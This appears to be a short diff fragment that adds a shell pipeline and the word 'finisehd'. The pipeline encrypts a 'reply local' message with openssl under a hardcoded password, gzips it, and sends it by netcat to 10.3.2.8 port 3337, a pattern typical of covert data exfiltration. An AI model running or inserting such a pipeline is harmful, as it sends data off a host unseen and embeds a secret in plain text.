@@ -1,0 +1,2 @@
+10.3.2.7 1438383684 reply local | openssl enc -a -A -aes-256-cbc -k SuperSecretPWD | gzip -cf | nc -w 4 10.3.2.8 3337
+finisehd
